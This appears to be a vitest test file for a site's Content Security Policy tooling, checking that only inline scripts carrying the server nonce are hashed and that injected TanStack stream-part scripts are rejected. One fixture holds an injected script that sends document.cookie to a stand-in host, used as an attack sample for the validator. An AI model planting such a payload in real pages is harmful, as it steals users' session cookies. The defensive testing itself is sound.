import { describe, expect, it } from 'vitest'

import { adminThemeInitScript } from '#/lib/admin/admin-theme'
import {
  assertSentHtmlInlineScriptsMatchCsp,
  assertTsrStreamPartScriptsHaveSsrNonce,
  collectInlineScriptHashesFromHtml,
  collectInlineScriptHashesFromSentHtml,
  collectPublicHtmlInlineScriptSrcHashes,
  scriptSourceForCspHash,
  sha256SourceHash,
  stripScriptNonceAttributes,
} from '#/lib/public-inline-script-hashes.server'
import { buildPublicHtmlContentSecurityPolicy } from '#/lib/security-headers.server'

const SSR_NONCE = 'ssr-nonce-token'

describe('public inline script hashes', () => {
  it('normalizes null bytes like HTML script parsing', () => {
    const raw = 'a\0b'
    expect(scriptSourceForCspHash(raw)).toBe('a\uFFFDb')
    expect(sha256SourceHash(scriptSourceForCspHash(raw))).toBe(
      sha256SourceHash('a\uFFFDb'),
    )
  })

  it('hashes inline scripts with the SSR nonce', () => {
    const html =
      `<script nonce="${SSR_NONCE}">allowed()</script>` +
      '<script>evil()</script>'
    const hashes = collectInlineScriptHashesFromHtml(html, SSR_NONCE)
    expect(hashes).toHaveLength(1)
    expect(hashes[0]).toBe(sha256SourceHash('allowed()'))
  })

  it('does not hash injected TanStack-like scripts without the SSR nonce', () => {
    const html =
      `<script nonce="${SSR_NONCE}">ok()</script>` +
      '<p>cms</p><script data-tsr-stream-part>evil()</script>'
    const hashes = collectInlineScriptHashesFromHtml(html, SSR_NONCE)
    expect(hashes).toHaveLength(1)
    expect(hashes[0]).toBe(sha256SourceHash('ok()'))
  })

  it('hashes TanStack stream transport scripts when they carry the SSR nonce', () => {
    const body = 'self.$_TSR=1'
    const html =
      `<script nonce="${SSR_NONCE}">ok()</script>` +
      `<script data-tsr-stream-part nonce="${SSR_NONCE}">${body}</script>`
    const hashes = collectInlineScriptHashesFromHtml(html, SSR_NONCE)
    expect(hashes).toHaveLength(2)
    expect(hashes).toContain(sha256SourceHash('ok()'))
    expect(hashes).toContain(sha256SourceHash(body))
  })

  it('does not hash TanStack stream transport scripts with a wrong nonce', () => {
    const html =
      `<script nonce="${SSR_NONCE}">ok()</script>` +
      '<script data-tsr-stream-part nonce="other">evil()</script>'
    const hashes = collectInlineScriptHashesFromHtml(html, SSR_NONCE)
    expect(hashes).toHaveLength(1)
    expect(hashes[0]).toBe(sha256SourceHash('ok()'))
    expect(() =>
      assertTsrStreamPartScriptsHaveSsrNonce(html, SSR_NONCE),
    ).toThrow(/missing the SSR nonce/)
  })

  it('does not hash stream bootstrap with a wrong nonce attribute', () => {
    const body = 'self.$_TSR={}'
    const html =
      `<script nonce="${SSR_NONCE}">ok()</script>` +
      `<script data-tsr-stream-part nonce="other">${body}</script>`
    expect(collectInlineScriptHashesFromHtml(html, SSR_NONCE)).toHaveLength(1)
    expect(() =>
      assertTsrStreamPartScriptsHaveSsrNonce(html, SSR_NONCE),
    ).toThrow(/missing the SSR nonce/)
  })

  it('does not hash nonce-less stream tags even with a bootstrap substring', () => {
    const body = "self.$_TSR;fetch('//x?'+document.cookie)"
    const html =
      `<script nonce="${SSR_NONCE}">ok()</script>` +
      `<script data-tsr-stream-part="">${body}</script>`
    expect(collectInlineScriptHashesFromHtml(html, SSR_NONCE)).toHaveLength(1)
    expect(() =>
      assertTsrStreamPartScriptsHaveSsrNonce(html, SSR_NONCE),
    ).toThrow(/missing the SSR nonce/)
    const sent = stripScriptNonceAttributes(
      `<script nonce="${SSR_NONCE}">ok()</script>`,
      SSR_NONCE,
    )
    expect(() =>
      collectPublicHtmlInlineScriptSrcHashes(
        html,
        `${sent}${`<script data-tsr-stream-part="">${body}</script>`}`,
        SSR_NONCE,
      ),
    ).toThrow(/Untrusted inline script/)
  })

  it('does not hash delayed bootstrap markers in stream tags', () => {
    const body = 'x();self.$_TSR={}'
    const html = `<script data-tsr-stream-part="">${body}</script>`
    expect(collectInlineScriptHashesFromHtml(html, SSR_NONCE)).toHaveLength(0)
    expect(() =>
      assertTsrStreamPartScriptsHaveSsrNonce(html, SSR_NONCE),
    ).toThrow(/missing the SSR nonce/)
  })

  it('rejects stream tags injected in page content without the SSR nonce', () => {
    const html = [
      '<main>',
      '<p>post</p>',
      '<script data-tsr-stream-part="">self.$_TSR=1</script>',
      '</main>',
    ].join('')
    expect(() =>
      assertTsrStreamPartScriptsHaveSsrNonce(html, SSR_NONCE),
    ).toThrow(/missing the SSR nonce/)
  })

  it('rejects CSP hashes that do not match shipped scripts', () => {
    const html = '<script>one()</script>'
    const csp = buildPublicHtmlContentSecurityPolicy(
      { NODE_ENV: 'test' },
      {
        ga4: null,
        gtm: null,
        plausible: null,
        vercelAnalytics: false,
      },
      [sha256SourceHash('one()'), sha256SourceHash('orphan()')],
    )
    expect(() => assertSentHtmlInlineScriptsMatchCsp(html, csp)).toThrow(
      /not present in HTML/,
    )
  })

  it('strips SSR nonce attributes from output html', () => {
    const html = `<script nonce="${SSR_NONCE}">x</script>`
    expect(stripScriptNonceAttributes(html, SSR_NONCE)).toBe(
      '<script>x</script>',
    )
  })

  it('includes the admin theme bootstrap script in public CSP hashes', () => {
    const body = adminThemeInitScript()
    const html = `<script nonce="${SSR_NONCE}">${body}</script>`
    const hashes = collectInlineScriptHashesFromHtml(html, SSR_NONCE)
    expect(hashes).toHaveLength(1)
    expect(hashes[0]).toBe(sha256SourceHash(scriptSourceForCspHash(body)))
  })

  it('requires every shipped inline script hash to appear in CSP', () => {
    const html =
      '<script>one()</script><script data-tsr-stream-part>two()</script>'
    const csp = buildPublicHtmlContentSecurityPolicy(
      { NODE_ENV: 'test' },
      {
        ga4: null,
        gtm: null,
        plausible: null,
        vercelAnalytics: false,
      },
      [sha256SourceHash('one()'), sha256SourceHash('two()')],
    )
    assertSentHtmlInlineScriptsMatchCsp(html, csp)
    expect(() =>
      assertSentHtmlInlineScriptsMatchCsp(
        html,
        buildPublicHtmlContentSecurityPolicy(
          { NODE_ENV: 'test' },
          {
            ga4: null,
            gtm: null,
            plausible: null,
            vercelAnalytics: false,
          },
          [sha256SourceHash('one()')],
        ),
      ),
    ).toThrow(/missing/)
  })

  it('matches sent hashes after nonce strip', () => {
    const html = `<script nonce="${SSR_NONCE}">bootstrap()</script>`
    const hashes = collectInlineScriptHashesFromHtml(html, SSR_NONCE)
    const sent = stripScriptNonceAttributes(html, SSR_NONCE)
    expect(collectInlineScriptHashesFromSentHtml(sent)).toEqual(hashes)
  })
})
